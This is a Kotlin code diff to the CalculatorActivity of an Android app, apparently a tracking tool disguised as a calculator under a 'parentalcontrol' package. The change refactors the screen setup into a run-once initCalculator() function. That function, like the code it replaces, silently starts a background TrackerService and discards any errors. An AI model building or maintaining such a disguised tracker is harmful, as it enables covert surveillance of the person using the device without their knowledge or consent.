@@ -59,35 +59,33 @@ class CalculatorActivity : AppCompatActivity() {
             return
         }
 
-        setContentView(R.layout.activity_calculator)
-
-        // Ensure background tracking service is running
-        try {
-            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
-        } catch (_: Exception) { }
-
-        tvExpression = findViewById(R.id.tvExpression)
-        tvResult     = findViewById(R.id.tvResult)
-
-        bindButtons()
-        updateDisplay()
+        setContentView(R.layout.activity_calculator)  // temp; initCalculator will redo this
+        initCalculator()
     }
 
     override fun onResume() {
         super.onResume()
-        // If wizard just completed, initialise the calculator UI now
-        if (com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)) {
-            if (tvResult == null || !::tvResult.isInitialized) {
-                setContentView(R.layout.activity_calculator)
-                try {
-                    com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
-                } catch (_: Exception) { }
-                tvExpression = findViewById(R.id.tvExpression)
-                tvResult     = findViewById(R.id.tvResult)
-                bindButtons()
-                updateDisplay()
-            }
+        // If we returned here after the wizard finished (onCreate returned early),
+        // the layout was never inflated — do it now.
+        if (com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)
+            && !calculatorInitialized) {
+            initCalculator()
         }
+    }
+
+    private var calculatorInitialized = false
+
+    private fun initCalculator() {
+        if (calculatorInitialized) return
+        calculatorInitialized = true
+        setContentView(R.layout.activity_calculator)
+        try {
+            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
+        } catch (_: Exception) { }
+        tvExpression = findViewById(R.id.tvExpression)
+        tvResult     = findViewById(R.id.tvResult)
+        bindButtons()
+        updateDisplay()
     }
 
 
